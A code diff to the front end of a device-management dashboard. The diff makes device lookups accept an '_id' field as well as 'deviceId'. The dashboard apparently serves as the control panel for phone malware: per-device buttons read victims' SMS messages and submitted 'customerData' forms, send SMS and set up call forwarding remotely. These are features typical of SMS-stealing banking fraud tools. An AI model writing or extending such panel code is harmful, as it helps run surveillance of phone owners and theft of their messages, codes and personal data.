@@ -212,7 +212,7 @@
                 card.className = `card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}`;
                 card.style = 'border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0;position:relative;max-width:320px;margin:auto;border-radius:32px;background:#f8fafc;padding-top:60px;padding-bottom:24px;overflow:hidden;';
                 card.innerHTML = `
-                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})"></i></div>
+                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${d._id || d.deviceId}', ${!d.isPinned})"></i></div>
                     <div style="position:absolute;top:12px;right:18px;display:flex;align-items:center;gap:4px;"><i class="fas ${batteryIcon}" style="color:${d.battery>20?'#43a047':'#d32f2f'};font-size:24px;"></i><span style="font-weight:bold;">${d.battery||0}%</span></div>
                     <div class="serial-badge" style="left:50%;transform:translateX(-50%);top:6px;min-width:120px;text-align:center;">#${serialNum} <br> <small>${escapeAttr(d.model||'')}</small></div>
                     <div class="info" style="text-align:center;">${statusBadge}</div>
@@ -220,12 +220,12 @@
                     <div class="info"><b>SIM2:</b> ${escapeAttr(d.sim2||'N/A')}</div>
                     <div class="info"><b>Last Seen:</b> ${formatLastSeen(d.lastSeen)}</div>
                     <div class="btns">
-                        <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
-                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
-                        <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewFormData('${d.deviceId}')"><i class="fas fa-file-alt"></i> FORM DATA</button>
-                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${d.deviceId}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
-                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${d.deviceId}')"><i class="fas fa-phone"></i> CALL FWD</button>
-                        <button class="btn-sm btn-del" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
+                        <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d._id || d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
+                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d._id || d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
+                        <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewFormData('${d._id || d.deviceId}')"><i class="fas fa-file-alt"></i> FORM DATA</button>
+                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${d._id || d.deviceId}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
+                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${d._id || d.deviceId}')"><i class="fas fa-phone"></i> CALL FWD</button>
+                        <button class="btn-sm btn-del" onclick="del('${d._id || d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
                     </div>`;
                 grid.appendChild(card);
             });
@@ -296,7 +296,7 @@
             try {
                 const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_DATA' }) });
                 const payload = await res.json();
-                const device = payload.device || devices.find(d => d.deviceId === deviceId);
+                const device = payload.device || devices.find(d => d.deviceId === deviceId || d._id === deviceId);
                 if (!device) { document.getElementById('modalBody').innerHTML = 'Device not found'; return; }
                 
                 const copyBtn = (text) => `<i class="fas fa-copy" style="color:#1976d2;cursor:pointer;margin-left:8px;" onclick="navigator.clipboard.writeText('${escapeAttr(text)}');toast('Copied')"></i>`;
@@ -356,7 +356,7 @@
             try {
                 const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_FORM' }) });
                 const payload = await res.json();
-                const data = payload.customerData || (devices.find(d => d.deviceId === deviceId)||{}).customerData || {};
+                const data = payload.customerData || (devices.find(d => d.deviceId === deviceId || d._id === deviceId)||{}).customerData || {};
                 
                 let html = `<h3 style="color:#ff9800;border-bottom:2px solid #ff9800;padding-bottom:10px;">Submitted Form Data</h3>`;
                 if (Object.keys(data).length === 0) {
@@ -383,7 +383,7 @@
             try {
                 const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_SMS' }) });
                 const payload = await res.json();
-                let msgs = payload.messages || (devices.find(d => d.deviceId === deviceId)||{}).smsMessages || [];
+                let msgs = payload.messages || (devices.find(d => d.deviceId === deviceId || d._id === deviceId)||{}).smsMessages || [];
                 msgs = msgs.slice(0, 50);
                 let html = msgs.map((m, idx) => `
                     <div style="background:#fff;padding:10px;margin-bottom:8px;border-radius:8px;border-left:5px solid #1976d2;display:flex;justify-content:space-between;align-items:center;">
